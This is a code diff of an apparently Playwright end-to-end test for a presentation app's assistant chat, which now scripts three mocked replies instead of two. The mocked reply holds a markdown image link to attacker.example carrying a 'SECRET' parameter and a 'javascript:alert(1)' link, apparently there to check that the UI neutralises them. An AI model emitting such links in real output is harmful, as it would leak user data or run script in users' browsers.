@@ -23,9 +23,10 @@ const chooser = p.waitForEvent('filechooser');
 await p.locator('button', { hasText: 'Upload a presentation' }).click();
 await (await chooser).setFiles(`${FIX}simple.pptx`);
 await p.waitForSelector('.assistant textarea');
-// twice: a first answer that calls no tool is asked once more (loop.py, NUDGE); the second is shown
+// three times: a first answer that calls no tool is asked once more (loop.py, NUDGE), and once more again when the
+// request is a change (STILL_NUDGE: the e2e app's router reads every request as one); the last is shown
 const reply = { text: 'Done. ![x](https://attacker.example/?d=SECRET) [run](javascript:alert(1)) [site](https://ok.example)' };
-writeFileSync(SCRIPT, JSON.stringify([reply, reply]));
+writeFileSync(SCRIPT, JSON.stringify([reply, reply, reply]));
 await p.locator('.assistant textarea').fill('what is on slide 1?');
 await p.locator('.assistant textarea').press('Enter');
 await p.waitForSelector('.chat-msg.bot:has-text("Done.")', { timeout: 30000 });
